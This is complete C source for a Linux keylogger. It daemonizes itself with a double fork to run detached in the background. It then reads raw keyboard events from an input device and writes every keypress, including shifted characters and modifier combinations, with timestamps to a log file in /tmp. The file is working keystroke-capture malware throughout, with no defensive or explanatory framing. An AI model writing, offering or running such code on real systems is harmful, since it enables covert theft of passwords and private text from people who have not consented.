#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>

#include <linux/input.h>
#include <linux/input-event-codes.h>

// --- Configuration ---
const char *DEVICE_PATH = "/dev/input/event3"; // CHANGE IF NEEDED
const char *LOG_FILE_PATH = "/tmp/keylog.txt"; // CHANGE IF NEEDED
// --------------------

// --- Key Code to Name Mapping (for non-character keys) ---
struct KeyMap {
    int code;
    const char *name;
};

static const struct KeyMap keymap[] = {
    {KEY_RESERVED, "RESERVED"}, {KEY_ESC, "ESC"}, {KEY_BACKSPACE, "BACKSPACE"},
    {KEY_TAB, "TAB"}, {KEY_ENTER, "ENTER"}, {KEY_LEFTCTRL, "LEFTCTRL"},
    {KEY_LEFTSHIFT, "LEFTSHIFT"}, {KEY_RIGHTSHIFT, "RIGHTSHIFT"}, {KEY_KPASTERISK, "KPASTERISK"},
    {KEY_LEFTALT, "LEFTALT"}, {KEY_CAPSLOCK, "CAPSLOCK"},
    {KEY_F1, "F1"}, {KEY_F2, "F2"}, {KEY_F3, "F3"}, {KEY_F4, "F4"}, {KEY_F5, "F5"},
    {KEY_F6, "F6"}, {KEY_F7, "F7"}, {KEY_F8, "F8"}, {KEY_F9, "F9"}, {KEY_F10, "F10"},
    {KEY_NUMLOCK, "NUMLOCK"}, {KEY_SCROLLLOCK, "SCROLLLOCK"}, {KEY_KPENTER, "KPENTER"},
    {KEY_RIGHTCTRL, "RIGHTCTRL"}, {KEY_KPSLASH, "KPSLASH"}, {KEY_SYSRQ, "SYSRQ"},
    {KEY_RIGHTALT, "RIGHTALT"}, {KEY_LINEFEED, "LINEFEED"}, {KEY_HOME, "HOME"},
    {KEY_UP, "UP"}, {KEY_PAGEUP, "PAGEUP"}, {KEY_LEFT, "LEFT"}, {KEY_RIGHT, "RIGHT"},
    {KEY_END, "END"}, {KEY_DOWN, "DOWN"}, {KEY_PAGEDOWN, "PAGEDOWN"}, {KEY_INSERT, "INSERT"},
    {KEY_DELETE, "DELETE"}, {KEY_MACRO, "MACRO"}, {KEY_MUTE, "MUTE"},
    {KEY_VOLUMEDOWN, "VOLUMEDOWN"}, {KEY_VOLUMEUP, "VOLUMEUP"}, {KEY_POWER, "POWER"},
    {KEY_PAUSE, "PAUSE"}, {KEY_LEFTMETA, "LEFTMETA"}, {KEY_RIGHTMETA, "RIGHTMETA"},
    {KEY_COMPOSE, "COMPOSE"}, {KEY_STOP, "STOP"}, {KEY_AGAIN, "AGAIN"}, {KEY_PROPS, "PROPS"},
    {KEY_UNDO, "UNDO"}, {KEY_FRONT, "FRONT"}, {KEY_COPY, "COPY"}, {KEY_OPEN, "OPEN"},
    {KEY_PASTE, "PASTE"}, {KEY_FIND, "FIND"}, {KEY_CUT, "CUT"}, {KEY_HELP, "HELP"},
    {KEY_MENU, "MENU"}, {KEY_CALC, "CALC"}, {KEY_SETUP, "SETUP"}, {KEY_SLEEP, "SLEEP"},
    {KEY_WAKEUP, "WAKEUP"}, {KEY_FILE, "FILE"}, {KEY_SENDFILE, "SENDFILE"},
    {KEY_DELETEFILE, "DELETEFILE"}, {KEY_XFER, "XFER"}, {KEY_PROG1, "PROG1"},
    {KEY_PROG2, "PROG2"}, {KEY_WWW, "WWW"}, {KEY_MSDOS, "MSDOS"},
    {KEY_SCREENLOCK, "SCREENLOCK"}, {KEY_DIRECTION, "DIRECTION"}, {KEY_CYCLEWINDOWS, "CYCLEWINDOWS"},
    {KEY_MAIL, "MAIL"}, {KEY_BOOKMARKS, "BOOKMARKS"}, {KEY_COMPUTER, "COMPUTER"},
    {KEY_BACK, "BACK"}, {KEY_FORWARD, "FORWARD"}, {KEY_CLOSECD, "CLOSECD"},
    {KEY_EJECTCD, "EJECTCD"}, {KEY_EJECTCLOSECD, "EJECTCLOSECD"}, {KEY_NEXTSONG, "NEXTSONG"},
    {KEY_PLAYPAUSE, "PLAYPAUSE"}, {KEY_PREVIOUSSONG, "PREVIOUSSONG"}, {KEY_STOPCD, "STOPCD"},
    {KEY_RECORD, "RECORD"}, {KEY_REWIND, "REWIND"}, {KEY_PHONE, "PHONE"}, {KEY_ISO, "ISO"},
    {KEY_CONFIG, "CONFIG"}, {KEY_HOMEPAGE, "HOMEPAGE"}, {KEY_REFRESH, "REFRESH"},
    {KEY_EXIT, "EXIT"}, {KEY_MOVE, "MOVE"}, {KEY_EDIT, "EDIT"}, {KEY_SCROLLUP, "SCROLLUP"},
    {KEY_SCROLLDOWN, "SCROLLDOWN"}, {KEY_KPLEFTPAREN, "KPLEFTPAREN"}, {KEY_KPRIGHTPAREN, "KPRIGHTPAREN"},
    {KEY_F11, "F11"}, {KEY_F12, "F12"},
};

// Function to lookup key name from code (used for non-character keys)
const char *get_special_key_name(int code) {
    for (size_t i = 0; i < sizeof(keymap) / sizeof(keymap[0]); ++i) {
        if (keymap[i].code == code) {
            return keymap[i].name;
        }
    }
    static char unknown_code[32];
    snprintf(unknown_code, sizeof(unknown_code), "UNKNOWN_%d", code);
    return unknown_code;
}

// --- Daemonization Function ---
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // Parent exits

    if (setsid() < 0) exit(EXIT_FAILURE); // Create new session

    pid = fork(); // Fork again to prevent process from acquiring a terminal
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // First child exits

    if (chdir("/") < 0) exit(EXIT_FAILURE); // Change working directory

    umask(0); // Set file mode creation mask

    // Close standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

// --- Global state for modifiers ---
int shift_pressed = 0; // 0 = no shift, > 0 = shift pressed
int caps_lock_on = 0;  // 0 = off, 1 = on
int ctrl_pressed = 0;  // Track control key state
int alt_pressed = 0;   // Track alt key state
int meta_pressed = 0;  // Track meta/super key state

// --- Helper to get character representation ---
char get_char_for_key(int code, int shift, int caps) {
    // Determine if the output should be upper case
    int upper = (shift != caps); // XOR: Shift changes case, Caps Lock changes case

    switch (code) {
        // Letters
        case KEY_A: return upper ? 'A' : 'a'; case KEY_B: return upper ? 'B' : 'b';
        case KEY_C: return upper ? 'C' : 'c'; case KEY_D: return upper ? 'D' : 'd';
        case KEY_E: return upper ? 'E' : 'e'; case KEY_F: return upper ? 'F' : 'f';
        case KEY_G: return upper ? 'G' : 'g'; case KEY_H: return upper ? 'H' : 'h';
        case KEY_I: return upper ? 'I' : 'i'; case KEY_J: return upper ? 'J' : 'j';
        case KEY_K: return upper ? 'K' : 'k'; case KEY_L: return upper ? 'L' : 'l';
        case KEY_M: return upper ? 'M' : 'm'; case KEY_N: return upper ? 'N' : 'n';
        case KEY_O: return upper ? 'O' : 'o'; case KEY_P: return upper ? 'P' : 'p';
        case KEY_Q: return upper ? 'Q' : 'q'; case KEY_R: return upper ? 'R' : 'r';
        case KEY_S: return upper ? 'S' : 's'; case KEY_T: return upper ? 'T' : 't';
        case KEY_U: return upper ? 'U' : 'u'; case KEY_V: return upper ? 'V' : 'v';
        case KEY_W: return upper ? 'W' : 'w'; case KEY_X: return upper ? 'X' : 'x';
        case KEY_Y: return upper ? 'Y' : 'y'; case KEY_Z: return upper ? 'Z' : 'z';

        // Numbers (Top Row)
        case KEY_1: return shift ? '!' : '1'; case KEY_2: return shift ? '@' : '2';
        case KEY_3: return shift ? '#' : '3'; case KEY_4: return shift ? '$' : '4';
        case KEY_5: return shift ? '%' : '5'; case KEY_6: return shift ? '^' : '6';
        case KEY_7: return shift ? '&' : '7'; case KEY_8: return shift ? '*' : '8';
        case KEY_9: return shift ? '(' : '9'; case KEY_0: return shift ? ')' : '0';

        // Symbols
        case KEY_MINUS: return shift ? '_' : '-';
        case KEY_EQUAL: return shift ? '+' : '=';
        case KEY_LEFTBRACE: return shift ? '{' : '[';
        case KEY_RIGHTBRACE: return shift ? '}' : ']';
        case KEY_SEMICOLON: return shift ? ':' : ';';
        case KEY_APOSTROPHE: return shift ? '"' : '\'';
        case KEY_GRAVE: return shift ? '~' : '`';
        case KEY_BACKSLASH: return shift ? '|' : '\\';
        case KEY_COMMA: return shift ? '<' : ',';
        case KEY_DOT: return shift ? '>' : '.';
        case KEY_SLASH: return shift ? '?' : '/';

        // Space
        case KEY_SPACE: return ' ';

        // Keypad (Assuming NumLock is ON - a simplification)
        case KEY_KP1: return '1'; case KEY_KP2: return '2'; case KEY_KP3: return '3';
        case KEY_KP4: return '4'; case KEY_KP5: return '5'; case KEY_KP6: return '6';
        case KEY_KP7: return '7'; case KEY_KP8: return '8'; case KEY_KP9: return '9';
        case KEY_KP0: return '0';
        case KEY_KPDOT: return '.'; case KEY_KPASTERISK: return '*';
        case KEY_KPMINUS: return '-'; case KEY_KPPLUS: return '+';
        case KEY_KPSLASH: return '/'; case KEY_KPEQUAL: return '=';

        // Not a simple character key
        default: return 0;
    }
}

// Format timestamp in ISO-8601 format
void get_iso_timestamp(char *buffer, size_t size) {
    time_t now;
    struct tm tm_info;
    
    time(&now);
    localtime_r(&now, &tm_info);
    
    strftime(buffer, size, "%Y-%m-%dT%H:%M:%S%z", &tm_info);
}

// Get modifier state as a string
const char* get_modifier_state() {
    static char mod_state[32];
    snprintf(mod_state, sizeof(mod_state), "%s%s%s%s", 
        shift_pressed > 0 ? "SHIFT+" : "",
        ctrl_pressed > 0 ? "CTRL+" : "",
        alt_pressed > 0 ? "ALT+" : "",
        meta_pressed > 0 ? "META+" : "");
    
    // Remove trailing "+" if any modifiers are active
    size_t len = strlen(mod_state);
    if (len > 0 && mod_state[len-1] == '+') {
        mod_state[len-1] = '\0';
    }
    
    return mod_state;
}

int main() {
    daemonize();

    FILE *logFile = fopen(LOG_FILE_PATH, "a");
    if (logFile == NULL) {
        return 1; // Cannot log failure in daemon mode
    }

    int fd = open(DEVICE_PATH, O_RDONLY);
    if (fd == -1) {
        char timestamp[32];
        get_iso_timestamp(timestamp, sizeof(timestamp));
        fprintf(logFile, "ERROR\t%s\tFAILED_TO_OPEN_DEVICE\t%s\t%s\n",
                timestamp, DEVICE_PATH, strerror(errno));
        fflush(logFile);
        fclose(logFile);
        return 1;
    }

    char timestamp[32];
    get_iso_timestamp(timestamp, sizeof(timestamp));
    fprintf(logFile, "INFO\t%s\tKEYLOGGER_STARTED\tPID=%d\tDEVICE=%s\n",
            timestamp, getpid(), DEVICE_PATH);
    fflush(logFile);

    struct input_event ev;

    while (read(fd, &ev, sizeof(ev)) > 0) {
        if (ev.type == EV_KEY) {
            // Update modifier state
            if (ev.code == KEY_LEFTSHIFT || ev.code == KEY_RIGHTSHIFT) {
                if (ev.value == 1) shift_pressed++;
                else if (ev.value == 0 && shift_pressed > 0) shift_pressed--;
            } else if (ev.code == KEY_LEFTCTRL || ev.code == KEY_RIGHTCTRL) {
                if (ev.value == 1) ctrl_pressed++;
                else if (ev.value == 0 && ctrl_pressed > 0) ctrl_pressed--;
            } else if (ev.code == KEY_LEFTALT || ev.code == KEY_RIGHTALT) {
                if (ev.value == 1) alt_pressed++;
                else if (ev.value == 0 && alt_pressed > 0) alt_pressed--;
            } else if (ev.code == KEY_LEFTMETA || ev.code == KEY_RIGHTMETA) {
                if (ev.value == 1) meta_pressed++;
                else if (ev.value == 0 && meta_pressed > 0) meta_pressed--;
            } else if (ev.code == KEY_CAPSLOCK && ev.value == 1) {
                caps_lock_on = !caps_lock_on;
            }

            // Only log key press events (not repeats or releases)
            // Change to ev.value != 0 to log both press and release events
            if (ev.value == 1) {
                get_iso_timestamp(timestamp, sizeof(timestamp));
                
                char char_repr = get_char_for_key(ev.code, shift_pressed > 0, caps_lock_on);
                const char *modifiers = get_modifier_state();
                
                if (char_repr != 0) {
                    // It's a character key
                    fprintf(logFile, "KEY\t%s\tCHAR\t%c\t%s\n", 
                            timestamp, char_repr, modifiers);
                } else {
                    // It's a special key
                    const char *keyName = get_special_key_name(ev.code);
                    fprintf(logFile, "KEY\t%s\tSPECIAL\t%s\t%s\n", 
                            timestamp, keyName, modifiers);
                }
                
                fflush(logFile);
            }
        }
    }

    // Log exit information
    get_iso_timestamp(timestamp, sizeof(timestamp));
    fprintf(logFile, "INFO\t%s\tKEYLOGGER_STOPPED\tPID=%d\tREASON=%s\n",
            timestamp, getpid(), strerror(errno));
    fflush(logFile);

    close(fd);
    fclose(logFile);

    return 0;
}